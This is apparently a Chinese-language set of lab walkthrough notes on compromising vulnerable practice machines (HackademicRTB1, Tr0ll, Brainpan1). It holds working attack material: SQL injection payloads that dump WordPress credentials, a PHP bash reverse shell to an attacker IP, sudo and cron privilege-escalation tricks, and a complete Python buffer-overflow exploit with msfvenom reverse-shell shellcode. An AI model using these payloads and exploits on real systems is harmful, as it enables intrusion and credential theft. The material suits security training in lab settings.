注意最好使用kali里面的火绒游览器来上传这个tar.gz文件，否则上传可能会出现不自动解压提取的情况
于是先把文件打包并压缩成指定上传格式
tar czf shell.tar.gz php-reverse-shell.php 
然后上传的时候进行自动解压缩
```

![image-20250125021419061](靶场攻击1/image-20250125021419061.png)		

```
访问http://10.10.10.130/~etenenbaum，结果发现确实就是这个目录，里面具有上传的文件
```

![image-20250125020507923](靶场攻击1/image-20250125020507923.png)	

```
点击这个文件，正好kali监听的端口收到反弹shell，此时收到了初级用户的shell
```

![image-20250125022726216](靶场攻击1/image-20250125022726216.png)	

```
查看sudo命令，发现有几个能够执行，其实mv命令能够执行sudo就已经能够造成提权了。
```

![image-20250125022803093](靶场攻击1/image-20250125022803093.png)	

```
比如说此时先保存tar命令一份原版可执行文件。
mv /bin/tar /bin/tar.orig
使用sudo将su命令重命名为tar
sudo mv /bin/su /bin/tar
然后执行tar，但本质上就是执行su，所以就提权到root了
sudo tar
```

![image-20250125023134776](靶场攻击1/image-20250125023134776.png)	

![image-20250125023146870](靶场攻击1/image-20250125023146870.png)	

# HackademicRTB1

```
扫描C段，确定靶机ip
nmap -sn 10.10.10.0/24  
```

![image-20250125124719503](靶场攻击1/image-20250125124719503.png)	

```
根据靶机ip扫描开放端口,发现只有80端口开放
nmap --min-rate 10000 -p- 10.10.10.131
```

![image-20250125124814957](靶场攻击1/image-20250125124814957.png)	

```
扫描靶机是否有开放的UDP端口
nmap --min-rate 10000 -sU -p- 10.10.10.131
```

![image-20250125125016814](靶场攻击1/image-20250125125016814.png)	

```
检测开放端口的版本信息和操作系统信息
nmap -sT -sV -O -p80 10.10.10.131    
```

![image-20250125124946310](靶场攻击1/image-20250125124946310.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞,但并无发现有效信息，仅扫描出一个icons目录，但里面并无有效信息
nmap --script=vuln -p80 10.10.10.131 
```

![image-20250125125742190](靶场攻击1/image-20250125125742190.png)	

```
然后游览网页，发现参数cat存在sql注入漏洞
```

![image-20250125125208548](靶场攻击1/image-20250125125208548.png)	

```
根据下面的payload可以确定，这个数据库表具有五个字段。
1 order by 5
通过以下payload，确定回显点是2
3 union select 1,2,3,4,5#
```

![image-20250125125546127](靶场攻击1/image-20250125125546127.png)	

```
查看使用该数据库的用户，发现是root
3 union select 1,user(),3,4,5#
```

![image-20250125125626737](靶场攻击1/image-20250125125626737.png)

```
通过查看前端源码，发现这个网页并不是自己开发的，而是用wordpress部署的
```

![image-20250125130242392](靶场攻击1/image-20250125130242392.png)	

```
由于接下来要使用分隔符把所有用户表中的字段相隔开，于是查看分隔符0x2d可以用于分隔
ascii
```

![image-20250125130129325](靶场攻击1/image-20250125130129325.png)	

```
通过web查询可以得知wp_users表存放着账号和密码以及用户权限等级信息，于是使用以下payload进行获取,会发现GeorgeMiller用户权限最高。
3 union select 1,group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users#
```

![image-20250125130930608](靶场攻击1/image-20250125130930608.png)	

```
首先判断这些用户的密码hash类型
hash-identifier '7cbb3252ba6b7e9c422fac5334d22054'
```

![image-20250125131023497](靶场攻击1/image-20250125131023497.png)	

```
通过字典碰撞出这个hash值,明文密码是q1w2e3
hashcat -m 0 -a 0 7cbb3252ba6b7e9c422fac5334d22054 /usr/share/wordlists/rockyou.txt
```

![image-20250125131209349](靶场攻击1/image-20250125131209349.png)	

```
因一级目录扫描并无发现有效信息，由于访问网页后发现这个二级目录，那么就根据这个二级目录，进行目录扫描，发现扫描出很多wordpress相关目录，从而有判断出了后台登录页面地址。
dirb http://10.10.10.131/Hackademic_RTB1/
```

![image-20250125131543519](靶场攻击1/image-20250125131543519.png)	

```
根据数据库得知的账号密码登录进后台系统
```

![image-20250125131658056](靶场攻击1/image-20250125131658056.png)	

```
里面设置允许文件上传，并且可以对php后缀的文件进行上传操作。
```

![image-20250125131839180](靶场攻击1/image-20250125131839180.png)	

```
将以下内容的shell.php上传。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'");?>
```

![image-20250125132000428](靶场攻击1/image-20250125132000428.png)	

```
由于上传文件还透露了其中的路径，于是接下啦就很容易得到shell了
```

![image-20250125132012663](靶场攻击1/image-20250125132012663.png)	

```
kali建立监听，然后访问这个shell.php,从而获得初级用户的shell.
nc -lvnp 1234
```

![image-20250125132130754](靶场攻击1/image-20250125132130754.png)	

```
然后尝试提权，发现sudo无可执行命令，且定时计划任务也无提权的手段，查看敏感文件发现mysql的root密码，尝试使用su切换root用户登录，但是发现密码并不对，那么这些路线走不通只能尝试内核提权了。
首先查看内核版本。
uname -a
```

![image-20250125132846183](靶场攻击1/image-20250125132846183.png)	

```
查看该内核可利用的漏洞,由于有一些是ubuntu系统的提权和这个靶机操作系统不一样，所以排除掉，且根据内核版本感觉15285.c应该是合适的。
searchsploit 2.6.3|grep 'Privilege Escalation'
```

![image-20250125133520195](靶场攻击1/image-20250125133520195.png)

```
下载这个漏洞提权文件。
searchsploit 2.6.3 -m 15285.c
kali部署web服务器
python -m http.server 8089
靶机下载提权漏洞文件
wget http://10.10.10.128:8089/15285.c
```

​	![image-20250125133829360](靶场攻击1/image-20250125133829360.png)	

```
编译这个漏洞提权文件
gcc 15285.c -o 15285
运行提权漏洞,于是提权root成功
./15285
```

![image-20250125133933975](靶场攻击1/image-20250125133933975.png)	

# Tr0ll

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24
```

![image-20250125154630212](靶场攻击1/image-20250125154630212.png)	

```
对靶机的ip进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.132
```

![image-20250125154657530](靶场攻击1/image-20250125154657530.png)	

```
对靶机的UDP端口进行扫描
nmap -sU --min-rate 10000 -p- 10.10.10.132
```

![image-20250125154842753](靶场攻击1/image-20250125154842753.png)	

```
对开放端口的服务版本和操作系统进行探测
nmap -sT -sV -O -p21,22,80 10.10.10.132
```

![image-20250125154813320](靶场攻击1/image-20250125154813320.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞
nmap --script=vuln -p21,22,80 10.10.10.132
```



```
根据开放端口22优先级最低，21ftp端口的渗透最容易，于是先从ftp出发
登录ftp，使用anonymous匿名，发现能够登录.
ftp 10.10.10.132
```

![image-20250125154936242](靶场攻击1/image-20250125154936242.png)	

```
发现只存在一个pcap后缀的文件，于是下载到本地。
先切换到二进制模式在下载文件，这样不会出错。
binary
下载文件
get lol.pcap
```

![image-20250125155043322](靶场攻击1/image-20250125155043322.png)	

```
查看文件类型,发现是wireshark捕获流量包文件
file lol.pcap
```

![image-20250125155147776](靶场攻击1/image-20250125155147776.png)	

```
使用wireshark打开,但是从中找出关键字信息，其实可以使用strings，这样效率更高而且更便捷，因为pcap文件本身也是文本文件，所以可以使用strings进行分析。
wireshark lol.pcap
```

```
查看该文件的对应文本,进行分析发现使用ftp下载了secret_stuff.txt文件，并且该文件里面的内容提示关键字sup3rs3cr3tdirlol,而这个关键字实际上是leetspeak的描述，本质上表示得到是supersecretdirlol翻译过来与目录相关，于是尝试使用这个关键字去作为url访问。
strings lol.pcap
```

![image-20250125155755680](靶场攻击1/image-20250125155755680.png)	

```
根据dirb目录扫描的url路径依次访问并无任何有效信息，于是根据分析的sup3rs3cr3tdirlol关键字，看能否作为url访问，发现里面存在一个roflmao文件，于是点击下载下来。
```

![image-20250125160856311](靶场攻击1/image-20250125160856311.png)	

```
查看这个文件类型，发现是ELF32位可执行文件
file roflmao
```

![image-20250125161017625](靶场攻击1/image-20250125161017625.png)	

```
对于这种可执行文件要保持警惕性，需要查看该文件是否有捆绑包,经过检验发现并无捆绑包。
binwalk roflmao
```

![image-20250125161122053](靶场攻击1/image-20250125161122053.png)	

```
将这个可执行文件进行执行，里面提示了一个地址，不知道这个是内存地址还是网页url地址。
以字符的形式查看这个可执行文件,发现里面也提示了address信息
strings roflmao
```

![image-20250125161234530](靶场攻击1/image-20250125161234530.png)	

![image-20250125161332462](靶场攻击1/image-20250125161332462.png)	

```
发现能够以网址进行访问，里面存在两个目录。
```

![image-20250125161405997](靶场攻击1/image-20250125161405997.png)	

```
其中第一个目录，存放了一个txt，怀疑是用户名文件，因为另一个目录存放的是密码文件。
```

![image-20250125161521409](靶场攻击1/image-20250125161521409.png)	

```
而另一个目录就是密码文件的内容，将其账户和密码都分别复制到user.txt和pass.txt上。
```

![image-20250125161603232](靶场攻击1/image-20250125161603232.png)	

```
使用密码喷洒攻击，发现一开始的用户是认证错误，后面是连接不了，说明这个ssh服务设置了防暴力破解ssh的策略
crackmapexec ssh 10.10.10.132 -u user.txt -p pass.txt --continue-on-success
```

![image-20250125162215527](靶场攻击1/image-20250125162215527.png)

```
于是把剩下几个用户放到user.txt的前面，在进行密码喷洒攻击,但是都失败了。
crackmapexec ssh 10.10.10.132 -u user.txt -p pass.txt --continue-on-success
```

![image-20250125162541016](靶场攻击1/image-20250125162541016.png)	

```
当感觉要不知道怎么不下去的时候，之前的一个目录提示说密码就包含在目录当中，那既然pass.txt文件的密码不对，那就以这个文件名作为密码进行尝试。将文件名复制到pass.txt中。然后再次进行密码喷洒攻击，此时知道了该用户的账号和密码了(overflow:Pass.txt)
crackmapexec ssh 10.10.10.132 -u user.txt -p pass.txt --continue-on-success
```

![image-20250125162751118](靶场攻击1/image-20250125162751118.png)	

```
使用ssh登录获得了初始的shell，接下来提权环节，查询sudo发现没有可执行的命令
```

![image-20250125163118068](靶场攻击1/image-20250125163118068.png)	

```
发现每隔一段时间就会退出ssh的登录，故怀疑有定时计划任务。
```

![image-20250125163016837](靶场攻击1/image-20250125163016837.png)	

```
于是查看定时计划任务,但是发现权限不够。
cat /etc/crontab
```

![image-20250125163144795](靶场攻击1/image-20250125163144795.png)	

```
于是只能查找crontab定时计划任务日志。
find / -name cronlog
并查看这个文件，发现每隔两分钟执行py文件。
```

![image-20250125163438767](靶场攻击1/image-20250125163438767.png)	

```
于是查找这个py文件的位置，并对里面的内容进行修改
find / -name cleaner.py
将内容进行修改，让其执行这个命令，使得vmware用户具有sudo执行任意命令且不用密码。
```

![image-20250125163647660](靶场攻击1/image-20250125163647660.png)	

```
等待两分钟即可提权，使用sudo进行提权获得root权限。
sudo /bin/bash
```

![image-20250125163947466](靶场攻击1/image-20250125163947466.png)	

![image-20250125164041116](靶场攻击1/image-20250125164041116.png)	

# Brainpan1

```
扫描c端，确定靶机的ip地址
nmap -sn 10.10.10.0/24  
```

![image-20250201180724806](靶场攻击1/image-20250201180724806.png)	

```
根据确定的靶机ip,扫描开放的端口,发现开放了abyss和snet两个服务,不过完全没听过这两个服务。
nmap --min-rate 10000 -p- 10.10.10.133
```

![image-20250201180802199](靶场攻击1/image-20250201180802199.png)	

```
根据这两个开放端口，扫描版本号以及操作系统信息,首先可以发现10000端口是一个web服务，9999端口上的服务暂时还是不清楚是什么。
nmap -sT -sV -O -p9999,10000 10.10.10.133
```

![image-20250201181035425](靶场攻击1/image-20250201181035425.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞
nmap --script=vuln -p9999,10000 10.10.10.133
```



```
接下来根据端口优先级，先渗透web端，那么就访问10000端口，里面仅一个网页包含一些图片，查看源码也没无有效信息。
```

![image-20250201181255635](靶场攻击1/image-20250201181255635.png)	

```
于是进行目录扫描，由于目录扫描前几个工具用的比较多，可以尝试学习新工具进行目录扫描，使用WFUZZ进行扫描。
根据该命令执行得到很多结果，然后根据结果进行过滤不存在的目录
wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.133:10000/FUZZ
于是根据结果过滤出，存在一个目录bin
wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hw 25 http://10.10.10.133:10000/FUZZ
当然实际的目录选择，也可以使用该字典进行目录爆破
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
可以使用该字典进行gobuster目录爆破
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.133:10000/
```

![image-20250201181626388](靶场攻击1/image-20250201181626388.png)	

```
访问bin目录发现里面存放着一个可执行文件。
```

![image-20250201182320179](靶场攻击1/image-20250201182320179.png)	

```
于是使用kali下载下来
wget http://10.10.10.133:10000/bin/brainpan.exe
```

![image-20250201182437223](靶场攻击1/image-20250201182437223.png)	

```
由于不知道9999端口是怎么样的，可以使用nc连接试试，发现里面可以进行交互，但是一交互就出现访问拒绝，可能输入特定的关键字才行，比如我在里面输入123，直接说访问拒绝。
nc 10.10.10.133 9999
```

![image-20250201182524632](靶场攻击1/image-20250201182524632.png)	

```
接下来查看这个下载的文件属于什么类型
file brainpan.exe
```

![image-20250201182620463](靶场攻击1/image-20250201182620463.png)	

```
再查看这个可执行文件是否存在捆绑文件，防止这个是恶意文件
binwalk brainpan.exe
```

![image-20250201182710622](靶场攻击1/image-20250201182710622.png)	

```
查看这个可执行文件的所有字符串信息,发现里面有一个shitstorm有点类似9999端口的访问密码，并且还出现复制多少字节数据到缓冲区的信息，于是可以判断该文件可能存在缓冲区溢出漏洞。
```

![image-20250201185742508](靶场攻击1/image-20250201185742508.png)	

```
再次连接9999端口，使用shitstorm，发现访问准许，但是并无其他信息了并且交互也结束了。
nc 10.10.10.133 9999
```

![image-20250201185908067](靶场攻击1/image-20250201185908067.png)	.

```
于是怀疑这个9999端口其实部署的服务就是brainpan.exe文件的执行服务。于是可以使用windows尝试执行，来部署这个服务，点击brainpan.exe执行，里面显示等待连接。
```

![image-20250201190114575](靶场攻击1/image-20250201190114575.png)	

```
使用kali连接这个windows部署的brainpan服务，发现输入内容后，会把数据复制到缓冲区，并显示复制了4B到缓冲区
```

![image-20250201190231137](靶场攻击1/image-20250201190231137.png)	

```python
于是写一个exploit.py文件判断缓冲区溢出的大小
#!/usr/bin/python
import socket
import time
import sys
 
#figure out how many chars could make brainpan.exe crush
size = 100
while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #用于建立socket连接
        s.connect(("10.10.10.1",9999))    #连接windows机器的9999端口
        buffer = 'A' * size     #待发送字符串的长度，按照100个字符逐渐增加
        print "\n[+]Send evil buffer %s bytes." % size    #提示发送了多少个字符
        s.send(buffer)     #发送字符串
        s.close()          #连接关闭
        size += 100
        time.sleep(2)      #每发送一次，睡眠2s，便于我们观测过程
    except:
        print "\n[+] Could not connect,error!\n"   #出现异常的提示
        sys.exit()             #系统退出
```

```
运行发现发送600B数据，会发现触发异常，说明发送的数据不超过600B就会触发缓冲区溢出
```

![image-20250201192734501](靶场攻击1/image-20250201192734501.png)	

```
使用msf生成600个随机杂乱的的字符
msf-pattern_create -l 600
```

![image-20250201192916812](靶场攻击1/image-20250201192916812.png)	

```
然后用ImmunityDebugger打开brainpan.exe文件。此时ImmunityDebugger这个工具相当于充当了CPU与brainpan.exe的中介，方便我们观察程序运行时的汇编语言的程序流、寄存器、堆栈、内存等情况。
```

![image-20250201194234143](靶场攻击1/image-20250201194234143.png)		

```
可以看到右下角是Paused，意思是这个文件是暂停状态的，我们点击左上角的running program按钮启动程序，此时右下角提示状态变为了Running。这种启动与直接双击exe文件的区别就是，使用ImmunityDebugger作为了中介而已。
```

![image-20250201194311810](靶场攻击1/image-20250201194311810.png)	

![image-20250201194332899](靶场攻击1/image-20250201194332899.png)	

```python
然后我们用刚刚生成的600字符的pattern字符串，重新构造payload，编写如下的exp2：
#!/usr/bin/python
import socket
import time
import sys
 
#figure out how many chars could make overflow exactly.
try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.10.1",9999))
        buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'
        print "\n[+]Send evil buffer 600 bytes."
        s.send(buffer)
        s.close()
        time.sleep(2)
except:
        print "\n[+] Could not connect,error!\n"
        sys.exit()
```

```
执行这个exp2.py，就是把刚刚生成的600个字符发送。
```

![image-20250201194606604](靶场攻击1/image-20250201194606604.png)	

```
回到ImmunityDebugger，可以看到这个字符串填入了EDX中，EDX还不够装，EIP也被装了字符，且ESP中还装了一部分，发现此时的EIP内容显示35724134，这个内容明显是msf生成600个字符内容的一部分。
```

![image-20250201194620191](靶场攻击1/image-20250201194620191.png)	

```
于是根据这个eip的内容可以确定偏移量为524。
其中-l指定原先生成字符的长度,-q是查询这个字符。
msf-pattern_offset -l 600 -q 35724134
```

![image-20250201195255599](靶场攻击1/image-20250201195255599.png)	

```python
可以看到偏移量是524，也就是只要发送524+4个字符，即可覆盖EIP寄存器，EIP寄存器存储的内容就是发送的528个字符中的最后4个字符（也就是说，第525-528个字符会填充EIP寄存器）。
为了验证发送的第525-528个字符会填充EIP寄存器，我们可以构造一个payload，发送600个字符，前524个字符都是A，第525-528个字符是B，用于覆盖EIP，最后72个字符用于凑数，都是C，据此编写exp3.py:
#!/usr/bin/python
import socket
import time
import sys
#cover EIP with 'BBBB'.
try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.10.1",9999))
        buffer = 'A' * 524 + 'B' * 4 + 'C' * 72
        print "\n[+]Send evil buffer 600 bytes(524 A, 4 B, 72 C)."
        s.send(buffer)
        s.close()
        time.sleep(2)
except:
        print "\n[+] Could not connect,error!\n"
        sys.exit()
```

![image-20250201195454861](靶场攻击1/image-20250201195454861.png)	

```
重新调试brainpan.exe文件，并点击运行进入running状态，然后运行exp3.py
可以发现eip都是42，而42的十六进制ascii码就是B,而esp都是c
```

![image-20250201195519435](靶场攻击1/image-20250201195519435.png)	

![image-20250201195659792](靶场攻击1/image-20250201195659792.png)	

```python
我们企图将shellcode放到ESP中，也就是现在72个C的位置，然而shellcode的大小通常是300-400字节左右，显然72字节是不够的，因此我们尝试再次进行溢出，这次发送的字符串是524个A、4个B、500个C，再次运行看看程序的崩溃情况和ESP内部的情况，如果崩溃情况与之前相同，ESP存放了500个C，就说明ESP的大小足够存放shellcode。构造如下的exp4.py：
#!/usr/bin/python
import socket
import time
import sys
 
#cover EIP with 'BBBB',cover ESP with 'C'*500 to figure out if ESP is big enough to cover shellcode.
try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.10.1",9999))
        buffer = 'A' * 524 + 'B' * 4 + 'C' * 500
        print "\n[+]Send evil buffer 1028 bytes(524 A, 4 B, 500 C)."
        s.send(buffer)
        s.close()
        time.sleep(2)
except:
        print "\n[+] Could not connect,error!\n"
        sys.exit()
```

```
运行exp4.py,然后从ImmunityDebbuger查看堆栈区域，发现第一个C的内存地址是0x005FF910，最后一个C的内存地址是0x005FFAE4
```

![image-20250201200220275](靶场攻击1/image-20250201200220275.png)	

![image-20250201200326771](靶场攻击1/image-20250201200326771.png)	

```
使用python计算发现有468B，那么肯定能把shellcode存放到esp指定的内存区域的。
```

![image-20250201200421487](靶场攻击1/image-20250201200421487.png)	

```
在C语言中，00是一个坏字符，作用是截断。所谓坏字节，就是程序中存在的会导致代码无法正常执行的字符，与程序本身和通信协议都相关。可以在github中具体查看坏字节的情况：
https://github.com/cytopia/badchars
可能存在的坏字节如下，图中没有包括\x00，因为\x00一定是坏字节，不需要再进行识别，所以在github能使用下面的格式来识别坏字节
```

![image-20250201200824268](靶场攻击1/image-20250201200824268.png)	

```python
#!/usr/bin/python                                                                           
import socket                                
import time                               
import sys                                    
#find badchars,cover ESP with possible badchars                                    
try:                                                                                         		 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)                 
        s.connect(("10.10.10.1",9999))                                                
        badchars = (                                                
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" + 
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" +  
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" +  
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" + 
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" +  
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" +   
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" +    
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" +   
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" +     
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" + 
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" +  
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" + 
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" +  
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" +  
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" +  
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"      
        )                                                           
        buffer = 'A' * 524 + 'B' * 4 + badchars                     
        print "\n[+]Send evil buffer many bytes(524 A, 4 B, 255 badchars)."                                                             
        s.send(buffer)
        s.close()                                                                                                                       
        time.sleep(2)                      
except:                                                                                     
        print "\n[+] Could not connect,error!\n"               
        sys.exit()                    
```

```
运行exp5.py，观察ESP的情况：
python2.7 exploit.py
点击ESP后的内存地址，然后右键->Follow in Dump，即可在左下的窗口看到内存情况
如下图，可以看到从01到FF是连续的，说明没有出现坏字节。如果有坏字节，可能会出现很多00的空字节。
```

![image-20250201201551638](靶场攻击1/image-20250201201551638.png)	

```
虽然ESP中可以存放shellcode，但我们如何保证程序的执行流程跳转到ESP中呢？这就需要通过EIP进行重定向，也就是找到汇编指令JMP ESP的内存地址，将这个内存地址覆盖到EIP中。由于EIP标记了下一条指令的执行地址，如果EIP被我们覆盖成了JMP ESP指令的内存地址，那么程序就会执行JMP ESP，然后如果ESP中存放了shellcode的话，就会成功利用。
首先，我们要找到指令JMP ESP的内存地址，在进行搜索的时候，不能用JMP ESP这样的字符直接搜索，而要用操作码opcode，JMP ESP的操作码可以用msf-nasm_shell进行查找，可以发现JMP ESP的操作码是FFE4。
```

![image-20250201201759655](靶场攻击1/image-20250201201759655.png)	

```
这里插叙一下，我第一次安装ImmuityDebugger后，输入!mona modules直接报错pycommands:error importing module。这是因为ImmuityDebugger的默认脚本并不保护mona.py这个文件，需要下载mona.py，并将这个文件放在PyCommends路径下。mona.py的下载地址见https://github.com/corelan/mona
```

```
接下来就是搜索FFE4了。在ImmuityDebugger中，可以很方便的直接执行python的一些脚本。在左下角的输入框输入!mona modules，可以看到当前运行程序的保护机制：
```

![image-20250201202219351](靶场攻击1/image-20250201202219351.png)		

```
通过mona.py可以看到当前运行的brainpan.exe的保护机制都是False，很容易被利用。因此靶机本身恰巧就支持我们定位JMP ESP，其实这里也不必强求非要利用靶机中的JMP ESP，寻找其他安全机制没有开启的程序也可以，只是当前的windows运行的其他程序都开启了许多安全机制，难以定位JMP ESP。
然后我们在brainpan.exe中搜索ffe4，命令如下：
!mona find -s "\xff\xe4" -m brainpan.exe
```

![image-20250201202457150](靶场攻击1/image-20250201202457150.png)	

```
总共找到了一个内存位置，311712f3，这个内存地址下存放了JMP ESP的指令。 因此我们要将这个内存地址写到EIP中，也就是之前写入B的位置。由于小端显示的问题，需要按照字节倒序的方式填入EIP中即"\xf3\x12\x17\x31"。
```

```
最后构造反弹shell的shellcode，这里直接用msfvemon生成即可，LHOST和LPORT指定ip和端口，-b指定坏字符，-e指定编码方式，这里选用shikata_ga_nai，这是个日语词汇，在免杀绕过领域比较好用，-f形成c语言代码。生成的shellcode的大小是351个字节（由于编码方式，每次生成的结果是不一样的）
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.128 LPORT=1234 -b "\x00" -e x86/shikata_ga_nai -f c
```

![image-20250201202826714](靶场攻击1/image-20250201202826714.png)	

```python
然后我们把原来ESP中C的位置填写为上述shellcode。shikata_ga_nai的编码方式对于我们进行免杀和绕过很有作用。但也会在生成几个“桩”用于解码。因此在构造payload的时候应该在ESP的开头位置填入若干个啥也不做的指令NOP（\x90），称为slide，防止“桩”被抹掉导致代码无法成功执行，再添加shellcode。当然，即使我们不适用编码进行免杀绕过，也可以添加几个NOP，滑过一些字节，保证shellcode不会被“抹掉”。完整的代码如下exp6.py:
#!/usr/bin/python                                        
import socket                                   
import time                                    
import sys                       
#set payload(windows_reverse_shell) for windows                         
try:                                                                
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
        s.connect(("10.10.10.1",9999))                    
        shellcode = ("\xbb\xb4\xe0\x42\x87\xdd\xc2\xd9\x74\x24\xf4\x5a\x29\xc9"
		"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xee\xee\xa0\x72\xf2"
		"\x07\xa6\x7d\x0a\xd8\xc7\xf4\xef\xe9\xc7\x63\x64\x59\xf8"
		"\xe0\x28\x56\x73\xa4\xd8\xed\xf1\x61\xef\x46\xbf\x57\xde"
		"\x57\xec\xa4\x41\xd4\xef\xf8\xa1\xe5\x3f\x0d\xa0\x22\x5d"
		"\xfc\xf0\xfb\x29\x53\xe4\x88\x64\x68\x8f\xc3\x69\xe8\x6c"
		"\x93\x88\xd9\x23\xaf\xd2\xf9\xc2\x7c\x6f\xb0\xdc\x61\x4a"
		"\x0a\x57\x51\x20\x8d\xb1\xab\xc9\x22\xfc\x03\x38\x3a\x39"
		"\xa3\xa3\x49\x33\xd7\x5e\x4a\x80\xa5\x84\xdf\x12\x0d\x4e"
		"\x47\xfe\xaf\x83\x1e\x75\xa3\x68\x54\xd1\xa0\x6f\xb9\x6a"
		"\xdc\xe4\x3c\xbc\x54\xbe\x1a\x18\x3c\x64\x02\x39\x98\xcb"
		"\x3b\x59\x43\xb3\x99\x12\x6e\xa0\x93\x79\xe7\x05\x9e\x81"
		"\xf7\x01\xa9\xf2\xc5\x8e\x01\x9c\x65\x46\x8c\x5b\x89\x7d"
		"\x68\xf3\x74\x7e\x89\xda\xb2\x2a\xd9\x74\x12\x53\xb2\x84"
		"\x9b\x86\x15\xd4\x33\x79\xd6\x84\xf3\x29\xbe\xce\xfb\x16"
		"\xde\xf1\xd1\x3e\x75\x08\xb2\x4a\x80\x18\xc2\x23\x96\x1c"
		"\xc6\x61\x1f\xfa\xac\x95\x76\x55\x59\x0f\xd3\x2d\xf8\xd0"
		"\xc9\x48\x3a\x5a\xfe\xad\xf5\xab\x8b\xbd\x62\x5c\xc6\x9f"
		"\x25\x63\xfc\xb7\xaa\xf6\x9b\x47\xa4\xea\x33\x10\xe1\xdd"
		"\x4d\xf4\x1f\x47\xe4\xea\xdd\x11\xcf\xae\x39\xe2\xce\x2f"
		"\xcf\x5e\xf5\x3f\x09\x5e\xb1\x6b\xc5\x09\x6f\xc5\xa3\xe3"
		"\xc1\xbf\x7d\x5f\x88\x57\xfb\x93\x0b\x21\x04\xfe\xfd\xcd"
		"\xb5\x57\xb8\xf2\x7a\x30\x4c\x8b\x66\xa0\xb3\x46\x23\xd0"
		"\xf9\xca\x02\x79\xa4\x9f\x16\xe4\x57\x4a\x54\x11\xd4\x7e"
		"\x25\xe6\xc4\x0b\x20\xa2\x42\xe0\x58\xbb\x26\x06\xce\xbc"
		"\x62") 
        buffer = 'A' * 524 + '\xf3\x12\x17\x31' + '\x90' * 16 + shellcode     
        print "\n[+]Send evil buffer many bytes(524 A, pos jmp ESP, 16 NOP, shellcode),including payload:windows_reverse_shell."
        s.send(buffer)                         
        s.close()                                 
        time.sleep(2) 
except:
        print "\n[+] Could not connect,error!\n"       
        sys.exit()
```

```
在windows测试后，确实可以获得shell.
```

![image-20250201203712464](靶场攻击1/image-20250201203712464.png)	

```
接下来把payload换成linux的。
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.128 LPORT=2345 -b "\x00" -e x86/shikata_ga_nai -f c
```

